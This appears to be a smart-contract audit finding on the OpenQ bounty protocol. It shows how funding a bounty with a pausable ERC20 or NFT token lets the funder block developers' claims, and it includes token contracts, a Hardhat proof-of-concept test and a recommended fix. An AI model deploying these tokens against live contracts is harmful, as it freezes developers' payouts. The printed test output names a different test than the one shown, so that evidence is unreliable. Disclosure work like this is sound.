@@ -1,0 +1,470 @@
+# [H] User can fund the bounty contract with malicious ERC20 token or NFT token to block developer’s claim at very low cost
+
+## Summary
+Severity: High
+Reporter: ctf_sec
+Source: https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/Mocks/MockLink.sol#L7
+Type: audit-issue
+
+## Details
+# User can fund the bounty contract with malicious ERC20 token or NFT token to block developer’s claim at very low cost
+
+## Summary
+
+User can fund the bounty contract with malicious ERC20 token or NFT token to block developer’s claim at very low cost
+
+## Vulnerability Detail
+
+In the current implementation, a user can fund the bounty contract with a ERC20 token. if the ERC20 token is not whitelisted, the transaction will not revert if the tokenAddressLimitReached check pass.
+
+```solidity
+/// @notice Transfers protocol token or ERC20 from msg.sender to bounty address
+/// @param _bountyAddress A bounty address
+/// @param _tokenAddress The ERC20 token address (ZeroAddress if funding with protocol token)
+/// @param _volume The volume of token transferred
+/// @param _expiration The duration until the deposit becomes refundable
+/// @param funderUuid The external user id of the funder
+function fundBountyToken(
+    address _bountyAddress,
+    address _tokenAddress,
+    uint256 _volume,
+    uint256 _expiration,
+    string memory funderUuid
+) external payable onlyProxy {
+    IBounty bounty = IBounty(payable(_bountyAddress));
+
+    if (!isWhitelisted(_tokenAddress)) {
+        require(
+            !tokenAddressLimitReached(_bountyAddress),
+            Errors.TOO_MANY_TOKEN_ADDRESSES
+        );
+    }
+
+    require(bountyIsOpen(_bountyAddress), Errors.CONTRACT_ALREADY_CLOSED);
+
+    (bytes32 depositId, uint256 volumeReceived) = bounty.receiveFunds{
+        value: msg.value
+    }(msg.sender, _tokenAddress, _volume, _expiration);
+
+    bytes memory funderUuidBytes = abi.encode(funderUuid);
+
+    emit TokenDepositReceived(
+        depositId,
+        _bountyAddress,
+        bounty.bountyId(),
+        bounty.organization(),
+        _tokenAddress,
+        block.timestamp,
+        msg.sender,
+        _expiration,
+        volumeReceived,
+        0,
+        funderUuidBytes,
+        VERSION_1
+    );
+}
+```
+
+This basically means that the validation of the supplied ERC20 token address is poor.
+
+For example, the user can supply a ERC20 token below, the admin owner of the token contract can disable the transfer any time.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.9;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "@openzeppelin/contracts/security/Pausable.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract MyToken is ERC20, Pausable, Ownable {
+    constructor() ERC20("MyToken", "MTK") {}
+
+    function pause() public onlyOwner {
+        _pause();
+    }
+
+    function unpause() public onlyOwner {
+        _unpause();
+    }
+
+    function _beforeTokenTransfer(address from, address to, uint256 amount)
+        internal
+        whenNotPaused
+        override
+    {
+        super._beforeTokenTransfer(from, to, amount);
+    }
+}
+```
+
+The user can supply the token above to the bounty contract and pause the token to disable the transfer. This is very problematic because this blocks developers from claiming any bounty.
+
+Let us assume the token above is supplied, let us say what would happen and trace the code,
+
+note the function call:
+
+```solidity
+(bytes32 depositId, uint256 volumeReceived) = bounty.receiveFunds{
+    value: msg.value
+}(msg.sender, _tokenAddress, _volume, _expiration);
+```
+
+which calls
+
+```solidity
+function receiveFunds(
+        address _funder,
+        address _tokenAddress,
+        uint256 _volume,
+        uint256 _expiration
+    )
+        external
+        payable
+        virtual
+        onlyDepositManager
+        nonReentrant
+        returns (bytes32, uint256)
+    {
+        require(_volume != 0, Errors.ZERO_VOLUME_SENT);
+        require(_expiration > 0, Errors.EXPIRATION_NOT_GREATER_THAN_ZERO);
+        require(status == OpenQDefinitions.OPEN, Errors.CONTRACT_IS_CLOSED);
+
+        bytes32 depositId = _generateDepositId();
+
+        uint256 volumeReceived;
+        if (_tokenAddress == address(0)) {
+            volumeReceived = msg.value;
+        } else {
+            volumeReceived = _receiveERC20(_tokenAddress, _funder, _volume);
+        }
+
+        funder[depositId] = _funder;
+        tokenAddress[depositId] = _tokenAddress;
+        volume[depositId] = volumeReceived;
+        depositTime[depositId] = block.timestamp;
+        expiration[depositId] = _expiration;
+        isNFT[depositId] = false;
+
+        deposits.push(depositId);
+        tokenAddresses.add(_tokenAddress);
+
+        return (depositId, volumeReceived);
+    }
+```
+
+which modifies two arrays:
+
+```solidity
+isNFT[depositId] = false;
+
+deposits.push(depositId);
+tokenAddresses.add(_tokenAddress);
+```
+
+When claiming the atomicBounty, the function is called:
+
+```solidity
+/// @notice Claim method for AtomicBounty
+/// @param _bounty The payout address of the bounty
+/// @param _closer The payout address of the claimant
+/// @param _closerData ABI Encoded data associated with this claim
+/// @dev See IAtomicBounty
+function _claimAtomicBounty(
+    IAtomicBounty _bounty,
+    address _closer,
+    bytes calldata _closerData
+) internal {
+    _eligibleToClaimAtomicBounty(_bounty, _closer);
+
+    for (uint256 i = 0; i < _bounty.getTokenAddresses().length; i++) {
+        uint256 volume = _bounty.claimBalance(
+            _closer,
+            _bounty.getTokenAddresses()[i]
+        );
+```
+
+the code loops over all token address and call claimBalance, which calls:
+
+```solidity
+/// @notice Transfers full balance of _tokenAddress from bounty to _payoutAddress
+/// @param _tokenAddress ERC20 token address or Zero Address for protocol token
+/// @param _payoutAddress The destination address for the funds
+function claimBalance(address _payoutAddress, address _tokenAddress)
+    external
+    onlyClaimManager
+    nonReentrant
+    returns (uint256)
+{
+    uint256 claimedBalance = getTokenBalance(_tokenAddress);
+    _transferToken(_tokenAddress, claimedBalance, _payoutAddress);
+    return claimedBalance;
+}
+```
+
+If the token transfer is paused, the _transferToken(_tokenAddress, claimedBalance, _payoutAddress) which revert the whole transaction and also blocks other token bounty transfer.
+
+Same issue exists in TieredPercentageBounty as well,
+
+```solidity
+for (uint256 i = 0; i < _bounty.getTokenAddresses().length; i++) {
+  uint256 volume = _bounty.claimTiered(
+      _closer,
+      _tier,
+      _bounty.getTokenAddresses()[i]
+  );
+```
+
+Which calls:
+
+```solidity
+/// @notice Transfers the tiered percentage of the token balance of _tokenAddress from bounty to _payoutAddress
+/// @param _payoutAddress The destination address for the fund
+/// @param _tier The ordinal of the claimant (e.g. 1st place, 2nd place)
+/// @param _tokenAddress The token address being claimed
+/// @return Volume of claimed token payout
+function claimTiered(
+    address _payoutAddress,
+    uint256 _tier,
+    address _tokenAddress
+) external onlyClaimManager nonReentrant returns (uint256) {
+    require(
+        bountyType == OpenQDefinitions.TIERED_PERCENTAGE,
+        Errors.NOT_A_TIERED_BOUNTY
+    );
+    require(!tierClaimed[_tier], Errors.TIER_ALREADY_CLAIMED);
+
+    uint256 claimedBalance = (payoutSchedule[_tier] *
+        fundingTotals[_tokenAddress]) / 100;
+
+    _transferToken(_tokenAddress, claimedBalance, _payoutAddress);
+    return claimedBalance;
+}
+```
+
+No matter how much claimedBalance is calculated, transaction revert in _transferToken(_tokenAddress, claimedBalance, _payoutAddress) because the token transfer is paused.
+
+I would like to highlight that supplying malicious ERC721 via fundNFT takes the same exploit path:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.9;
+
+import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
+import "@openzeppelin/contracts/security/Pausable.sol";
+import "@openzeppelin/contracts/access/Ownable.sol";
+
+contract MyToken is ERC721, Pausable, Ownable {
+    constructor() ERC721("MyToken", "MTK") {}
+
+    function pause() public onlyOwner {
+        _pause();
+    }
+
+    function unpause() public onlyOwner {
+        _unpause();
+    }
+
+    function _beforeTokenTransfer(address from, address to, uint256 tokenId, uint256 batchSize)
+        internal
+        whenNotPaused
+        override
+    {
+        super._beforeTokenTransfer(from, to, tokenId, batchSize);
+    }
+}
+```
+
+After NFT is supplied, the malicious admin owner of the NFT can pause the NFT transfer and the block user from claiming NFT token
+
+```solidity
+for (uint256 i = 0; i < _bounty.getNftDeposits().length; i++) {
+  bytes32 _depositId = _bounty.nftDeposits(i);
+  if (_bounty.tier(_depositId) == _tier) {
+      _bounty.claimNft(_closer, _depositId);
+
+      emit NFTClaimed(
+          _bounty.bountyId(),
+          address(_bounty),
+          _bounty.organization(),
+          _closer,
+          block.timestamp,
+          _bounty.tokenAddress(_depositId),
+          _bounty.tokenId(_depositId),
+          _bounty.bountyType(),
+          _closerData,
+          VERSION_1
+      );
+  }
+}
+```
+
+However, the risk of the user injecting malicious NFT is low because the code in depositManager.sol  check if the NFT is whitelisted but does not check if the ERC20 token address is whitelisted when user fund the bounty contract.
+
+```solidity
+/// @notice Transfers NFT from msg.sender to bounty address
+/// @param _bountyAddress The address of the bounty to fund
+/// @param _tokenAddress The ERC721 token address of the NFT
+/// @param _tokenId The tokenId of the NFT to transfer
+/// @param _expiration The duration until the deposit becomes refundable
+/// @param _data The tier of the NFT (not relevant for non-tiered bounties)
+function fundBountyNFT(
+    address _bountyAddress,
+    address _tokenAddress,
+    uint256 _tokenId,
+    uint256 _expiration,
+    bytes calldata _data
+) external onlyProxy {
+    IBounty bounty = IBounty(payable(_bountyAddress));
+
+    require(isWhitelisted(_tokenAddress), Errors.TOKEN_NOT_ACCEPTED);
+```
+
+The POC below shows that malicious token can easily block developer's withdraw.
+
+We assume that the mockLink is malicious and the mockDai is normal ERC20 token, we need to edit the MockLink
+
+https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/Mocks/MockLink.sol#L7
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.17;
+
+// Third party
+import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
+
+contract MockLink is ERC20 {
+
+    address public admin;
+    bool public paused = false;
+
+    constructor() ERC20('Mock Link', 'mLINK') {
+        _mint(msg.sender, 10000 * 10**18);
+        admin = msg.sender;
+    }
+
+    function pause() external {
+        paused = true;
+    }
+
+    function mint(uint256 amount) external {
+        _mint(msg.sender, amount * 10 ** 18);
+    }
+
+    function _beforeTokenTransfer(address from, address to, uint256 amount)
+        internal
+        override
+    { 
+        require(paused == false, "transfer is paused!!! sorry!!!!");
+        super._beforeTokenTransfer(from, to, amount);
+    }
+
+}
+```
+
+and edit the MockDai
+
+https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/Mocks/MockDai.sol#L7
+
+```solidity
+contract MockDai is ERC20 {
+    address public admin;
+
+    constructor() ERC20('Mock DAI', 'mDAI') {
+        _mint(msg.sender, 10000 * 10**18);
+        admin = msg.sender;
+    }
+
+    function mint(uint256 amount) external {
+        _mint(msg.sender, amount * 10 ** 18);
+    }
+}
+```
+
+Then we added the POC, in the POC, user1 supplies MockLink and then pause the token before developer claims the bounty and the claim transaction revert.
+
+https://github.com/sherlock-audit/2023-02-openq/blob/main/test/ClaimManager.test.js#L254
+
+```javascript
+it('User can supply malicious ERC20 token to block bounty withdraw', async () => {
+	// ARRANGE
+
+	const [ user1, user2, user3 ] = await ethers.getSigners();
+	
+	await openQProxy.mintBounty(Constants.bountyId, Constants.organization, atomicBountyInitOperation);
+	const bountyAddress = await openQProxy.bountyIdToAddress(Constants.bountyId);
+
+	const volume = 100;
+	const tokenDepositId = generateDepositId(Constants.bountyId, 0);
+
+	await mockLink.connect(user1).approve(bountyAddress, 10000000);
+	await mockDai.connect(user2).approve(bountyAddress, 10000000);
+	await mockDai.connect(user2).mint(1000000);
+
+	await depositManager.connect(user1).fundBountyToken(bountyAddress, mockLink.address, volume, 1, Constants.funderUuid);
+	await depositManager.connect(user2).fundBountyToken(bountyAddress, mockDai.address, volume, 1, Constants.funderUuid);
+
+	// const expectedTimestamp = await setNextBlockTimestamp(2764900);
+	// await depositManager.connect(user1).refundDeposit(bountyAddress, tokenDepositId)
+
+	// ASSUME
+	let bountyIsClaimable = await claimManager.bountyIsClaimable(bountyAddress);
+	expect(bountyIsClaimable).to.equal(true);
+
+	await mockLink.pause();
+	await claimManager.connect(oracle).claimBounty(bountyAddress, user3.address, abiEncodedSingleCloserData);
+
+	// ASSERT
+	bountyIsClaimable = await claimManager.bountyIsClaimable(bountyAddress);
+	expect(bountyIsClaimable).to.equal(false);
+});
+```
+
+We run the test:
+
+```javascript
+yarn test
+```
+
+and the output is:
+
+```javascript
+Compiled 1 Solidity file successfully
+
+
+  ClaimManager.sol
+    bountyIsClaimable
+      ATOMIC POC
+        1) if token A does not allow 0 amount transfer, claim bounty failed if user get refund after supplying bounty token
+
+
+  0 passing (2s)
+  1 failing
+
+  1) ClaimManager.sol
+       bountyIsClaimable
+         ATOMIC POC
+           if token A does not allow 0 amount transfer, claim bounty failed if user get refund after supplying bounty token:
+     Error: VM Exception while processing transaction: reverted with reason string 'transfer is paused!!! sorry!!!!'
+```
+
+
+## Impact
+
+Developer’s claim transaction is blocked and developer is not able to claim the bounty if user inject malicious ERC20 token.
+
+## Code Snippet
+
+https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/DepositManager/Implementations/DepositManagerV1.sol#L35-L51
+
+https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/Bounty/Implementations/AtomicBountyV1.sol#L85-L99
+
+https://github.com/sherlock-audit/2023-02-openq/blob/main/contracts/Bounty/Implementations/TieredPercentageBountyV1.sol#L98-L121
+
+## Tool used
+
+Manual Review
+
+## Recommendation
+
+Creating a pausable token in polygon has low cost because the transaction cost is low, we recommend the protocol validates the ERC20 token is also whitelisted when user supplies the token to fund the bounty contract.
